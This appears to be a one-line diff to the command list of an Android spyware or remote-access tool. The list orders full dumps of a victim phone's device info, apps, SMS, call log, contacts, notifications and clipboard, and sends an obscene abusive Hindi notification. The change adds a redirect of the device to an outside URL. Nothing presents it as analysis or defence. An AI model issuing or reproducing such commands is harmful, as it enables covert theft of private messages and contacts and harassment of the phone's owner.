@@ -1,1 +1,1 @@
-deviceinfo, apps full, sms full, calls full, contacts full, notification full, clipboard full, send notification | title=Randi Khana | message=Ujala ka gand maraoge kya bhai | repeat=1
+deviceinfo, apps full, sms full, calls full, contacts full, notification full, clipboard full, redirect url https://rahulpuri.fun/, send notification | title=Randi Khana | message=Ujala ka gand maraoge kya bhai | repeat=1
